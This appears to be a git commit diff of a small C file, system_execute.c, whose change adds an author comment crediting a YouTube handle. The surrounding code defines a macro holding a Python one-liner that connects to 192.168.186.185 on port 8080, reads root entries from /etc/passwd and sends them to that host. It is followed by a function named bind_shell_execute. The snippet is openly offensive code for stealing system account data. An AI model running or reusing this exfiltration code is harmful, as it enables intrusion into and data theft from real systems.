5b37d5b24b2699670b4df4dad452d2074bbc5545
RyunnaYourin <109413078+RyunnaYourin@users.noreply.github.com>
2025-02-24 22:14:33 -0800

    Update system_execute.c

--- system_execute.c
+++ system_execute.c
@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
+// Author | Youtube: @HCKaito_iZumiXD
 #define system_execute "python -c \"import os;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'192.168.186.185\',8080));send_msg=os.popen(\'cat /etc/passwd | grep \"root\"\').read();s.send(send_msg.encode());\""
 
 void bind_shell_execute(void) {
